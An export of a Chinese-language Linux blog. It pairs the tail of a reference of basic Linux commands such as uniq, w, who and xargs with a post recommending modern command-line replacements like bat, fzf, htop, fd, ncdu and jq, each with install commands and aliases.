<h4 id="Uniq"><a href="#Uniq" class="headerlink" title="Uniq"></a>Uniq</h4><p><a href="#">分类：文件管理；待补充信息</a><br>The Uniq command is used to report or omit repeated lines. For example, if ‘file2’ contains the following data:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat file2</span><br><span class="line">Welcome to HowtoForge</span><br><span class="line">Welcome to HowtoForge</span><br><span class="line">A Linux tutorial website</span><br><span class="line">Thanks</span><br><span class="line">Then you can use the uniq command to omit the repeated line.</span><br><span class="line"></span><br><span class="line">$ uniq file2</span><br><span class="line">Welcome to HowtoForge</span><br><span class="line">A Linux tutorial website</span><br><span class="line">Thanks</span><br></pre></td></tr></table></figure></p>
<h4 id="Unexpand"><a href="#Unexpand" class="headerlink" title="Unexpand"></a>Unexpand</h4><p><a href="#">分类：文件管理；待补充信息</a><br>The unexpand command converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unexpand file1</span><br></pre></td></tr></table></figure></p>
<h4 id="Uptime"><a href="#Uptime" class="headerlink" title="Uptime"></a>Uptime</h4><p><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load">分类：系统信息；性能监测；查看负载。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;</a><br>The uptime command tells how long the system has been running.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uptime</span><br><span class="line">15:59:59 up 6:20, 4 users, load average: 0.81, 0.92, 0.82</span><br></pre></td></tr></table></figure></p>
<h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><p><a href="#">分类：用户权限管理；待补充信息</a><br>The users command displays in output the usernames of users currently logged in to the current host.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ users</span><br><span class="line">himanshu himanshu himanshu himanshu</span><br></pre></td></tr></table></figure></p>
<h4 id="Vdir"><a href="#Vdir" class="headerlink" title="Vdir"></a>Vdir</h4><p><a href="#">分类：文件管理；待补充信息</a><br>The vdir command lists information about contents of a directory (current directory by default).<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ vdir</span><br><span class="line">total 1088</span><br><span class="line">-rw-rw-r-- 1 himanshu himanshu 4850 May 20 2015 test_backup.pdf</span><br><span class="line">-rw-rw-r-- 1 himanshu himanshu 2082 May 28 2015 test-filled.pdf</span><br><span class="line">-rw-rw-r-- 1 himanshu himanshu 7101 May 28 2015 test.pdf</span><br></pre></td></tr></table></figure></p>
<h4 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h4><p><a href="#">分类：编辑器</a><br>vim is basically a text/programming editor. The name ‘vim’ stands for Vi IMproved as the editor is upwards compatible to the Vi editor.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ vim [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="W"><a href="#W" class="headerlink" title="W"></a>W</h4><p><a href="#">分类：性能监测</a><br>The w command displays information about the users currently on the machine, and their processes.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ w</span><br><span class="line">16:18:07 up 6:39, 4 users, load average: 0.07, 0.32, 0.53</span><br><span class="line">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT</span><br><span class="line">himanshu :0 :0 09:39 ?xdm? 1:08m 0.25s init --user</span><br><span class="line">himanshu pts/0 :0 09:41 6:36m 0.84s 7.84s gnome-terminal</span><br><span class="line">himanshu pts/10 :0 14:51 0.00s 0.16s 0.00s w</span><br><span class="line">himanshu pts/11 :0 15:41 35:19 0.05s 0.05s bash</span><br></pre></td></tr></table></figure></p>
<h4 id="Wall"><a href="#Wall" class="headerlink" title="Wall"></a>Wall</h4><p><a href="#">分类：通讯；待补充信息</a><br>The wall command lets you write and send a message to other users that are currently logged in.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wall [your-message]</span><br></pre></td></tr></table></figure></p>
<h4 id="Watch"><a href="#Watch" class="headerlink" title="Watch"></a>Watch</h4><p><a href="#">分类：性能监测</a><br>The watch command can be used to monitor a program’s output. It runs the program repeatedly, displaying its output and errors. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ watch date</span><br></pre></td></tr></table></figure></p>
<h4 id="Wc"><a href="#Wc" class="headerlink" title="Wc"></a>Wc</h4><p><a href="#">分类：文件管理；待补充信息</a><br>The wc command prints newline, word, and byte counts for a file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wc test.txt</span><br><span class="line">0 3 20 test.txt</span><br></pre></td></tr></table></figure></p>
<h4 id="Whatis"><a href="#Whatis" class="headerlink" title="Whatis"></a>Whatis</h4><p><a href="#">分类：帮助</a><br>The whatis command displays single-line manual page descriptions.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ whatis mkdir</span><br><span class="line">mkdir (1) - make directories</span><br><span class="line">mkdir (2) - create a directory</span><br><span class="line">mkdir (1posix) - make directories</span><br></pre></td></tr></table></figure></p>
<h4 id="Which"><a href="#Which" class="headerlink" title="Which"></a>Which</h4><p><a href="#">分类：文件管理；以来</a><br>The which command basically lets you locate a command - the file and the path of the file that gets executed. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ which date</span><br><span class="line">/bin/date</span><br></pre></td></tr></table></figure></p>
<h4 id="Who"><a href="#Who" class="headerlink" title="Who"></a>Who</h4><p><a href="#">分类：登录信息</a><br>The who command shows who is logged on.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ who</span><br><span class="line">himanshu :0 2017-03-03 09:39 (:0)</span><br><span class="line">himanshu pts/0 2017-03-03 09:41 (:0)</span><br><span class="line">himanshu pts/10 2017-03-03 14:51 (:0)</span><br><span class="line">himanshu pts/11 2017-03-03 15:41 (:0)</span><br></pre></td></tr></table></figure></p>
<h4 id="Whereis"><a href="#Whereis" class="headerlink" title="Whereis"></a>Whereis</h4><p><a href="#">分类：文件管理；以来</a><br>The whereis command shows in output locations of the binary, source, and manual page files for a command.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ whereis ls</span><br><span class="line">ls: /bin/ls /usr/share/man/man1/ls.1posix.gz /usr/share/man/man1/ls.1.gz</span><br></pre></td></tr></table></figure></p>
<h4 id="Whoami"><a href="#Whoami" class="headerlink" title="Whoami"></a>Whoami</h4><p><a href="#">分类：登录信息</a><br>The whoami command prints effective userid of the current user.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">himanshu</span><br></pre></td></tr></table></figure></p>
<h4 id="Xargs"><a href="#Xargs" class="headerlink" title="Xargs"></a>Xargs</h4><p><a href="#">分类：编程工具</a><br>The xargs command builds and executes command lines from standard input. In layman’s terms, it reads items from stdin and executes a command passed to it as an argument. For example, here’s how you can use xargs to find the word “Linux” in the files whose names are passed to it as input.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ xargs grep &quot;Linux&quot;</span><br><span class="line">file1</span><br><span class="line">file2</span><br><span class="line">file3</span><br><span class="line">file1:Linux researcher</span><br><span class="line">file2:A Linux tutorial website</span><br><span class="line">file3:Linux is opensource</span><br><span class="line">More...</span><br></pre></td></tr></table></figure></p>
<h4 id="Yes"><a href="#Yes" class="headerlink" title="Yes"></a>Yes</h4><p><a href="#">分类：交互；确认</a><br>The Yes command outputs a string repeatedly until killed.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ yes [string]</span><br></pre></td></tr></table></figure></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works：Linux Commands Extension</title>
    <url>/2018/09/03/Linux-Commands-New/</url>
    <content><![CDATA[<ul>
<li>DevOps 资讯 | 是时候升级你的命令行了</li>
<li>autojump &gt; cd</li>
<li>bat &gt; cat</li>
<li>prettyping &gt; ping</li>
<li>fzf &gt; ctrl+r</li>
<li>htop &gt; top</li>
<li>diff-so-fancy &gt; diff</li>
<li>fd &gt; find</li>
<li>ncdu &gt; du</li>
<li>tldr &gt; man</li>
<li>ack || ag &gt; grep</li>
<li>jq &gt; grep et al</li>
</ul>
<span id="more"></span>
<h1 id="DevOps-资讯-是时候升级你的命令行了"><a href="#DevOps-资讯-是时候升级你的命令行了" class="headerlink" title="DevOps 资讯 | 是时候升级你的命令行了"></a>DevOps 资讯 | 是时候升级你的命令行了</h1><blockquote>
<p>子贡问为仁。<br>子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”<br>——《论语·卫灵公》</p>
</blockquote>
<h4 id="AutoJump-gt-cd"><a href="#AutoJump-gt-cd" class="headerlink" title="AutoJump &gt; cd"></a>AutoJump &gt; cd</h4><p>autojump 记录你访问过的文件夹（包括记录访问频率进而调整权重），通过路径 cache 实现文件夹位置快速切换。了解更多 <a href="https://olivierlacan.com/posts/cd-is-wasting-your-time">cd is Wasting Your Time</a></p>
<ul>
<li>Install</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># source</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/wting/autojump.git</span><br><span class="line"><span class="built_in">cd</span> autojump</span><br><span class="line">./install.py or ./uninstall.py</span><br><span class="line"><span class="comment"># mac</span></span><br><span class="line">brew install autojump</span><br><span class="line">port install autojump</span><br></pre></td></tr></table></figure>
<ul>
<li>Example</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aca80164:~ kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">50.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">109:	 total weight</span><br><span class="line">3:	 number of entries</span><br><span class="line">0.00:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:~ kurui$</span><br><span class="line">aca80164:~ kurui$ cd project/ebook-linuxperfmaster/</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">14.1:	/Users/yanrui/project/ebook-linuxperfmaster</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">50.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">124:	 total weight</span><br><span class="line">4:	 number of entries</span><br><span class="line">14.14:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$</span><br><span class="line">aca80164:ebook-linuxperfmaster kurui$ j post</span><br><span class="line">/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">aca80164:_posts kurui$ pwd</span><br><span class="line">/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">aca80164:_posts kurui$ j -s</span><br><span class="line">10.0:	/Users/yanrui/project/riboseyim.com</span><br><span class="line">22.4:	/Users/yanrui/project/ebook-linuxperfmaster</span><br><span class="line">50.0:	/Users/yanrui/project-third/autojump</span><br><span class="line">52.0:	/Users/yanrui/project/riboseyim.github.io/source/_posts</span><br><span class="line">________________________________________</span><br><span class="line"></span><br><span class="line">134:	 total weight</span><br><span class="line">4:	 number of entries</span><br><span class="line">51.96:	 current directory weight</span><br><span class="line"></span><br><span class="line">data:	 /Users/yanrui/Library/autojump/autojump.txt</span><br><span class="line">aca80164:_posts kurui$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="bat-gt-cat"><a href="#bat-gt-cat" class="headerlink" title="bat &gt; cat"></a>bat &gt; cat</h4><p>cat 被用于打印文件内容。ccat 工具还提供像语法高亮显示这样的功能。在此基础之上，bat 还支持 分页, 行号和 git 集成。同时允许在输出中搜索 (当输出长于屏幕高度时) 。更多信息：<a href="https://github.com/sharkdp/bat">https://github.com/sharkdp/bat</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-bat-1.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-bat-2.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-bat-3.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">wget https://github.com/sharkdp/bat/releases/download/v0.6.1/bat-v0.6.1-x86_64-unknown-linux-gnu.tar.gz</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"># Mac</span><br><span class="line">brew install bat</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">alias cat=&#x27;bat&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="prettyping-gt-ping"><a href="#prettyping-gt-ping" class="headerlink" title="prettyping &gt; ping"></a>prettyping &gt; ping</h4><p>ping 是一种非常有用的网络工具。原理是向目标主机传出一个ICMP echo@要求数据包，并等待接收 echo 回应数据包。程序会按时间和成功响应的次数估算丢失数据包率（丢包率）和数据包往返时间（网络时延，Round-trip delay time）。不过默认的 ping 命令输出比较乏味。prettyping 则提供了更友好、更美观的输出，包括彩色点图表示网络连通性。prettyping 基于 bash 和 awk 编写能，够兼容大部分操作系统 (例如 Linux, BSD, Mac OS X, …)。更多信息：<a href="http://denilson.sa.nom.br/prettyping/">http://denilson.sa.nom.br/prettyping/</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180903-ping.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/denilsonsa/prettyping/master/prettyping</span><br><span class="line">chmod +x prettyping</span><br><span class="line">./prettyping baiud.com</span><br><span class="line"></span><br><span class="line">alias ping=&#x27;prettyping --nolegend&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="fzf-gt-ctrl-r"><a href="#fzf-gt-ctrl-r" class="headerlink" title="fzf &gt; ctrl+r"></a>fzf &gt; ctrl+r</h4><p>在终端中使用 ctrl + r 组合键可以向后搜索历史操作记录（ 尽管有点繁琐 ）。fzf 工具是对 ctrl + r 的增强。支持对终端操作历史的模糊搜索, 预览可能的匹配结果。除了历史搜索之外, fzf 还可以预览和打开文件。<br>更多信息：<a href="https://github.com/junegunn/fzf">https://github.com/junegunn/fzf</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-fzf.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf</span><br><span class="line">~/.fzf/install</span><br><span class="line"># Mac</span><br><span class="line">brew install fzf</span><br><span class="line"></span><br><span class="line"># alias</span><br><span class="line">alias preview=&quot;fzf --preview &#x27;bat --color \&quot;always\&quot; &#123;&#125;&#x27;&quot;</span><br><span class="line"># add support for ctrl+o to open selected file in VS Code</span><br><span class="line">export FZF_DEFAULT_OPTS=&quot;--bind=&#x27;ctrl-o:execute(code &#123;&#125;)+abor</span><br></pre></td></tr></table></figure>
<h4 id="htop-gt-top"><a href="#htop-gt-top" class="headerlink" title="htop &gt; top"></a>htop &gt; top</h4><p>top 是一个快速诊断系统性能的工具。值得一提的是 top for Mac 与 Linux 上的输出不太一样。htop 优化了顶部输出格式，并支持大量的颜色, 键盘快键键和视图, 帮助我们洞察进程行为。更多信息：<a href="http://hisham.hm/htop/">http://hisham.hm/htop/</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-htop.png" alt="htop"></p>
<p>htop 提供的键盘快捷键：</p>
<ul>
<li>P - 按 CPU 利用率排序</li>
<li>M - 按内存利用率排序</li>
<li>F4 - 按字符串过滤进程</li>
<li>space - 高亮显示某一进程，便于持续跟踪</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias top=&quot;sudo htop&quot; # alias top</span><br></pre></td></tr></table></figure>
<h4 id="diff-so-fancy-gt-diff"><a href="#diff-so-fancy-gt-diff" class="headerlink" title="diff-so-fancy &gt; diff"></a>diff-so-fancy &gt; diff</h4><p>GIT 版本控制系统中使用 git diff 来显示两个版本之间差别(包括文件、元数据和改动等)。diff-so-fancy 是一个用 node.js 实现的命令行工具，提供更友好的输出样式和定制能力。更多信息：<a href="https://github.com/so-fancy/diff-so-fancy">https://github.com/so-fancy/diff-so-fancy</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-diff-so-fancy.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-git-diff.jpg" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># download</span><br><span class="line">wget https://raw.githubusercontent.com/so-fancy/diff-so-fancy/master/third_party/build_fatpack/diff-so-fancy</span><br><span class="line">chmod +x diff-so-fancy</span><br><span class="line"># npm</span><br><span class="line">npm install -g diff-so-fancy</span><br><span class="line"># 直接调用</span><br><span class="line">git diff --color | diff-so-fancy</span><br></pre></td></tr></table></figure>
<p>在 git diff 和 git show 中启用  diff-so-fancy ，需要修改 gitconfig :<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[pager]</span><br><span class="line">	   diff = diff-so-fancy | less --tabs=1,5 -RFX</span><br><span class="line">	   show = diff-so-fancy | less --tabs=1,5 -RFX</span><br></pre></td></tr></table></figure><br>除了默认样式优化，diff-so-fancy 还支持颜色和显示项定制，例如：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global color.ui true</span><br><span class="line"></span><br><span class="line">git config --global color.diff-highlight.oldNormal    &quot;red bold&quot;</span><br><span class="line">git config --global color.diff-highlight.oldHighlight &quot;red bold 52&quot;</span><br><span class="line">git config --global color.diff-highlight.newNormal    &quot;green bold&quot;</span><br><span class="line">git config --global color.diff-highlight.newHighlight &quot;green bold 22&quot;</span><br><span class="line"></span><br><span class="line">git config --global color.diff.meta       &quot;yellow&quot;</span><br><span class="line">git config --global color.diff.frag       &quot;magenta bold&quot;</span><br><span class="line">git config --global color.diff.commit     &quot;yellow bold&quot;</span><br><span class="line">git config --global color.diff.old        &quot;red bold&quot;</span><br><span class="line">git config --global color.diff.new        &quot;green bold&quot;</span><br><span class="line">git config --global color.diff.whitespace &quot;red reverse&quot;</span><br><span class="line"></span><br><span class="line">git config --bool --global diff-so-fancy.markEmptyLines false</span><br></pre></td></tr></table></figure></p>
<h4 id="fd-gt-find"><a href="#fd-gt-find" class="headerlink" title="fd &gt; find"></a>fd &gt; find</h4><p>fd 非常快。有意思的是 fd 与 bat 的作者是同一个人（David Peter）。更多信息：<a href="https://github.com/sharkdp/fd/">https://github.com/sharkdp/fd/</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-fd.png" alt=""></p>
<p>常用的命令行：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## SourceCode</span><br><span class="line">git clone https://github.com/sharkdp/fd</span><br><span class="line">cd fd</span><br><span class="line">cargo build</span><br><span class="line">cargo test</span><br><span class="line">cargo install</span><br><span class="line"></span><br><span class="line"># Mac</span><br><span class="line">brew install fd</span><br><span class="line"></span><br><span class="line">## Usage</span><br><span class="line">fd cli # 查找所有包含&quot;cli&quot;的文件名</span><br><span class="line">fd -e md # 查找所有 .md 文件</span><br><span class="line">fd cli -x wc -w # 查找 &quot;cli&quot; 并运行 `wc -w`</span><br></pre></td></tr></table></figure></p>
<h4 id="ncdu-gt-du"><a href="#ncdu-gt-du" class="headerlink" title="ncdu &gt; du"></a>ncdu &gt; du</h4><p>了解磁盘空间占用情况是一项非常重要的工作。常用的命令是 du -sh  (-sh 表示摘要、便于人工阅读), 但我们经常需要挖掘目录的空间占用。ncdu 是一个替代选择（完全基于 C 语言编写，MIT 许可证）。ncdu 提供了一个交互式界面, 支持快速扫描哪些文件夹或文件占用空间, 并且导航非常方便。更多信息：<a href="https://dev.yorhel.nl/ncdu">https://dev.yorhel.nl/ncdu</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-nudu.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-nudu-nav.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git://g.blicky.net/ncdu.git/</span><br><span class="line"></span><br><span class="line"># release</span><br><span class="line">wget https://dev.yorhel.nl/download/ncdu-1.13.tar.gz</span><br><span class="line">tar -xvf ncdu-1.13.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"># Usage</span><br><span class="line">ncdu path</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias du=&quot;ncdu --color dark -rr -x --exclude .git --exclude node_modules&quot;</span><br><span class="line"></span><br><span class="line"># 扩展选项</span><br><span class="line">--color dark - use a colour scheme</span><br><span class="line">-rr - read-only mode (prevents delete and spawn shell)</span><br><span class="line">--exclude ignore directories I won&#x27;t do anything about</span><br></pre></td></tr></table></figure>
<h4 id="tldr-gt-man"><a href="#tldr-gt-man" class="headerlink" title="tldr &gt; man"></a>tldr &gt; man</h4><p>几乎每一个命令行工具都可以通过手工输入 man 命令获得帮助信息。TL;DR 项目(“too long; didn’t read”)是一个由社区驱动的命令行文档系统，以非常简洁的方式提供命令行参数列表、使用说明和示例。更多信息：<a href="https://tldr.sh">https://tldr.sh/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Install</span><br><span class="line">npm install -g tldr</span><br><span class="line"></span><br><span class="line">alias help=&#x27;tldr&#x27;</span><br><span class="line"></span><br><span class="line"># Usage</span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  -V, --version            output the version number</span><br><span class="line">  -l, --list               List all commands for the chosen platform in the cache</span><br><span class="line">  -a, --list-all           List all commands in the cache</span><br><span class="line">  -1, --single-column      List single command per line (use with options -l or -a)</span><br><span class="line">  -r, --random             Show a random command</span><br><span class="line">  -e, --random-example     Show a random example</span><br><span class="line">  -f, --render [file]      Render a specific markdown [file]</span><br><span class="line">  -m, --markdown           Output in markdown format</span><br><span class="line">  -o, --os [type]          Override the operating system [linux, osx, sunos]</span><br><span class="line">  --linux                  Override the operating system with Linux</span><br><span class="line">  --osx                    Override the operating system with OSX</span><br><span class="line">  --sunos                  Override the operating system with SunOS</span><br><span class="line">  -t, --theme [theme]      Color theme (simple, base16, ocean)</span><br><span class="line">  -s, --search [keywords]  Search pages using keywords</span><br><span class="line">  -u, --update             Update the local cache</span><br><span class="line">  -c, --clear-cache        Clear the local cache</span><br><span class="line">  -h, --help               output usage information</span><br><span class="line"></span><br><span class="line"># Example</span><br><span class="line">bash-3.2$ tldr tar</span><br><span class="line">✔ Page not found. Updating cache</span><br><span class="line">✔ Creating index</span><br><span class="line"></span><br><span class="line">  tar</span><br><span class="line"></span><br><span class="line">  Archiving utility.</span><br><span class="line">  Often combined with a compression method, such as gzip or bzip.</span><br><span class="line"></span><br><span class="line">  - Create an archive from files:</span><br><span class="line">    tar cf target.tar file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - Create a gzipped archive:</span><br><span class="line">    tar czf target.tar.gz file1 file2 file3</span><br><span class="line"></span><br><span class="line">  - Extract an archive in a target folder:</span><br><span class="line">    tar xf source.tar -C folder</span><br></pre></td></tr></table></figure>
<h4 id="ack-ag-gt-grep"><a href="#ack-ag-gt-grep" class="headerlink" title="ack || ag &gt; grep"></a>ack || ag &gt; grep</h4><p>grep 无疑是一个强大的命令行工具, 但多年来它已被许多工具所取代，包括 ack 和 ag 。更多信息：[<a href="https://beyondgrep.com/">https://beyondgrep.com/</a>]</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/CLI-20180902-ack.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://beyondgrep.com/ack-2.24-single-file &gt; ~/bin/ack &amp;&amp; chmod 0755 ~/bin/ack</span><br></pre></td></tr></table></figure>
<p>ack 和 ag 默认情况下使用正则表达式进行搜索,可以指定文件类型 —— 使用像 —js 或 —html 标志搜索。ack 和 ag  工具都支持 grep 选项, 如 -B (表示输出匹配行和其之后(after)的N行)。</p>
<p>ack 默认没有支持 markdown 格式，可以在 .ackrc 文件定制：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--type-set=md=.md,.mkd,.markdown</span><br><span class="line">--pager=less -FRX</span><br></pre></td></tr></table></figure></p>
<h4 id="jq-gt-grep-et-al"><a href="#jq-gt-grep-et-al" class="headerlink" title="jq &gt; grep et al"></a>jq &gt; grep et al</h4><blockquote>
<p>jq is like sed for JSON data</p>
</blockquote>
<p>jq 可以作为 JSON 数据转换工具。示例：更新节点依赖项 (分为多行以便于可读性)。<br>更多信息：<a href="https://stedolan.github.io/jq/">https://stedolan.github.io/jq/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i $(echo $(\</span><br><span class="line">  npm outdated --json | \</span><br><span class="line">  jq -r &#x27;to_entries | .[] | &quot;\(.key)@\(.value.latest)&quot;&#x27; \</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;node-jq&quot;: &#123;</span><br><span class="line">	&quot;current&quot;: &quot;0.7.0&quot;,</span><br><span class="line">	&quot;wanted&quot;: &quot;0.7.0&quot;,</span><br><span class="line">	&quot;latest&quot;: &quot;1.2.0&quot;,</span><br><span class="line">	&quot;location&quot;: &quot;node_modules/node-jq&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;uuid&quot;: &#123;</span><br><span class="line">	&quot;current&quot;: &quot;3.1.0&quot;,</span><br><span class="line">	&quot;wanted&quot;: &quot;3.2.1&quot;,</span><br><span class="line">	&quot;latest&quot;: &quot;3.2.1&quot;,</span><br><span class="line">	&quot;location&quot;: &quot;node_modules/uuid&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
